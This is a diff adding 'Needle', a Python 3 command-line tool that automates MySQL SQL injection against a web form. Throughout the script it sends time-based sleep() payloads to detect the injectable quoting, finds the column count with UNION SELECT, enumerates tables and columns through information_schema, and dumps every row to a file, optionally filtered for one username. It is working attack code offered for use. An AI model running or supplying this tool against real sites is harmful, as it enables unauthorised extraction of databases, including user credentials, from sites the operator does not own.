@@ -1,0 +1,301 @@
+#!/usr/bin/python3
+
+'''
+Needle is a python3 script which performs sql injection. It currently only
+supports mysql injection.
+
+Copyright © 2018 Konstantinos Sarantopoulos
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+'''
+
+import requests,sys,re,time
+
+#---parse the arguments---
+#display help
+for i in range(0,len(sys.argv)):
+	if sys.argv[i] == "-h":
+		print('''Syntax: path_to_script  [-h][-u url][-c cookies][-d distinguisher][-f save_file]
+                    	[-user user][-p parameters][-s valid_search]
+
+Arguments:              -h: display help
+                        -u: the url to attempt sql injection to (write http://
+                            or https://)
+                        -c: the session cookies
+                        -d: the distinguisher (look at README)
+                        -f: the file to save successful results
+                        -user: the username to login to the site
+                        -p: the parameters of the query
+                        -s: a valid search''')
+#read the url
+for i in range(0,len(sys.argv)):
+	if sys.argv[i] == "-u":
+		url = sys.argv[i+1]
+#read the cookies if necessary to login
+for i in range(0,len(sys.argv)):
+	if sys.argv[i] == "-c":
+		cookies = {}
+		cookies_list = sys.argv[i+1]
+		cookies_list = cookies_list.split("/")
+		for i in range(0,len(cookies_list)):
+			cook = cookies_list[i].split("=")
+			cookies[cook[0]] = cook[1]
+#read the result distinguisher
+for i in range(0,len(sys.argv)):
+	if sys.argv[i] == "-d":
+		distinguisher = sys.argv[i+1]
+		distinguisher1 = distinguisher.split("DIST")[0]
+		distinguisher2 = distinguisher.split("DIST")[1]
+#file to save results
+for i in range(0,len(sys.argv)):
+	if sys.argv[i] == "-f":
+		file = sys.argv[i+1]
+#user to search for in the results
+for i in range(0,len(sys.argv)):
+	if sys.argv[i] == "-user":
+		user = sys.argv[i+1]
+#read the request parameters
+for i in range(0,len(sys.argv)):
+	if sys.argv[i] == "-p":
+		parameters = {}
+		parameters_string = sys.argv[i+1]
+		parameters_list = parameters_string.split("/")
+		for i in parameters_list:
+			para = i.split("=")
+			parameters[para[0]] = para[1]
+#read the valid search
+for i in range(0,len(sys.argv)):
+	if sys.argv[i] == "-s":
+		valid_search = sys.argv[i+1]
+
+#---declare some variables---
+skip = 0
+info = []
+final_info = []
+for key, value in parameters.items():
+	if value == "INJECT":
+		asterisk = key
+
+#---attempt sql injection---
+print ("\n---Needle started---")
+
+#make a request and time its duration, to check ' injection
+print ("attempting ' injection...")
+query = valid_search + "' and 1=sleep(2);#"
+parameters[asterisk] = query
+start = time.time()
+try:
+	cookies
+except NameError:
+	req = requests.post(url, data=parameters)
+else:
+	req = requests.post(url, cookies=cookies, data=parameters)
+end = time.time()
+#check the duration of the request to see if vulnerable to " injection
+if end - start < 3 and end - start > 1.9:
+	print ("' injection SUCCESSFUL")
+	inject = "'"
+	skip = 1
+else:
+	print ("' injection unsuccessful")
+if skip != 1:
+	#make a request and time its duration, to check " injection
+	print ("attempting \" injection...")
+	query = valid_search + "\" and 1=sleep(2);#"
+	parameters[asterisk] = query
+	start = time.time()
+	try:
+		cookies
+	except NameError:
+		req = requests.post(url, data=parameters)
+	else:
+		req = requests.post(url, cookies=cookies, data=parameters)
+	end = time.time()
+	#check the duration of the request to see if vulnerable to " injection
+	if end - start < 3 and end - start > 1.9:
+		print ("\" injection SUCCESSFUL")
+		inject = "\""
+		skip = 1
+	else:
+		print ("\" injection unsuccessful")
+if skip != 1:
+	#make a request and time its duration, to check if quotes are needed at all
+	print ("attempting empty injection...")
+	query = valid_search + " and 1=sleep(2);#"
+	parameters[asterisk] = query
+	start = time.time()
+	try:
+		cookies
+	except NameError:
+		req = requests.post(url, data=parameters)
+	else:
+		req = requests.post(url, cookies=cookies, data=parameters)
+	end = time.time()
+	#check the response text to see if vulnerable to " injection
+	response = re.findall("right syntax to use near '\"\"\"'", req.text)
+	if end - start < 3 and end - start > 1.9:
+		print ("empty injection SUCCESSFUL")
+		inject = ""
+		skip = 1
+	else:
+		print ("empty injection unsuccessful")
+#if none of the above injections worked exit
+if skip != 1:
+	print ("sql injection unsuccessful, exiting")
+	sys.exit()
+#make requests and time their duration, to find out the numbert of columns presented per result
+print ("finding the number of columns presented per result...")
+j = str(1)
+num_col = 1
+while True:
+	response = "not match"
+	query = valid_search + inject + " and 1=sleep(2) union all select " + j + " from dual;#"
+	parameters[asterisk] = query
+	start = time.time()
+	try:
+		cookies
+	except NameError:
+		req = requests.post(url, data=parameters)
+	else:
+		req = requests.post(url, cookies=cookies, data=parameters)
+	end = time.time()
+	if end - start < 3 and end - start > 1.9:
+		response = "match"
+	if response == "not match" and num_col <= 20:
+		num_col += 1
+		j += "," + str(num_col)
+	else:
+		break
+try:
+	inject
+except NameError:
+	print ("coudn't find the number of columns presented per result, exiting")
+	sys.exit()
+print ("the amount of columns presented per result is : " + str(num_col))
+#make a request to find all the tables of the current database
+print ("finding all the tables of the current database...")
+number = "TABLE_NAME"
+for i in range(0, num_col - 1):
+	number += "," + "TABLE_NAME"
+query = valid_search + inject + " union all select " + number + " from information_schema.TABLES where TABLE_SCHEMA = database();#"
+parameters[asterisk] = query
+try:
+	cookies
+except NameError:
+	req = requests.post(url, data=parameters)
+else:
+	req = requests.post(url, cookies=cookies, data=parameters)
+response = re.findall(distinguisher1 + ".*?" + distinguisher2, req.text)
+tables = str()
+for i in response:
+	table_name = i.split(distinguisher1)
+	table_name = table_name[1].split(distinguisher2)
+	table_name = table_name[0]
+	tables += " " + table_name
+tables = tables.split()
+if len(tables) > 0:
+	print ("tables found :", len(tables))
+else:
+	print ("tables not found, exiting")
+	sys.exit()
+#make a request to find all the columns
+print ("finding all the columns...")
+number = "COLUMN_NAME"
+for i in range(0, num_col - 1):
+	number += "," + "COLUMN_NAME"
+query = valid_search + inject + " union all select " + number + " from information_schema.COLUMNS where TABLE_SCHEMA = database();#"
+parameters[asterisk] = query
+try:
+	cookies
+except NameError:
+	req = requests.post(url, data=parameters)
+else:
+	req = requests.post(url, cookies=cookies, data=parameters)
+response = re.findall(distinguisher1 + ".*?" + distinguisher2, req.text)
+columns = str()
+for a in response:
+	column_name = a.split(distinguisher1)
+	column_name = column_name[1].split(distinguisher2)
+	column_name = column_name[0]
+	columns += " " + column_name
+columns = columns.split()
+if len(columns) > 0:
+	print ("columns found :", len(columns))
+else:
+	print ("columns not found, exiting")
+	sys.exit()
+#make requests to find all the rows
+for i in range(0, len(tables)):
+	print ("finding all the rows for table", str(i+1) + "/" + str(len(tables)) + "...")
+	for b in range(0, len(columns)):
+		'''
+		if i % num_col != 0:
+			continue
+		num = columns[i]
+		if len(columns) % 2 != 0 and i == len(columns) - 1:
+			pass
+		else:
+			for j in range(1, num_col):
+				num += "," + columns[i + j]
+		'''
+		#make a request to find all the rows of the specific column and table
+		num = columns[b]
+		for c in range(0, num_col - 1):
+			num += "," + columns[b]
+		query = valid_search + inject + " union all select " + num + " from " + tables[i] + ";#"
+		parameters[asterisk] = query
+		try:
+			cookies
+		except NameError:
+			req = requests.post(url, data=parameters)
+		else:
+			req = requests.post(url, cookies=cookies, data=parameters)
+		#put all the rows found for the table/column combination in a list
+		response = re.findall(distinguisher1 + ".*?" + distinguisher2, req.text)
+		rows = str()
+		for d in response:
+			row = d.split(distinguisher1)
+			row = row[1].split(distinguisher2)
+			row = row[0]
+			rows += " " + row
+		rows = rows.split()
+		if len(rows) > 0:
+			info.extend(["Table : " + tables[i] + ", Column: " + columns[b], str(rows)])
+
+#---print end result and save results
+if len(info) > 0:
+	print ("sql injection SUCCESSFUL, saving results...")
+	save = open(file, 'a')
+	try:
+		user
+	except NameError:
+		final_info = info
+	else:
+		for i in range(0, len(info)):
+			if user in info[i]:
+				table_column = info[i-1]
+				table_column = table_column.split(",")[0]
+		for i in range(0, len(info)):
+			if table_column in info[i]:
+				final_info.extend([info[i], info[i + 1]])
+	for i in final_info:
+		save.write(i + "\n")
+	save.close()
+else:
+	print ("sql injection unsuccessful, exiting...")
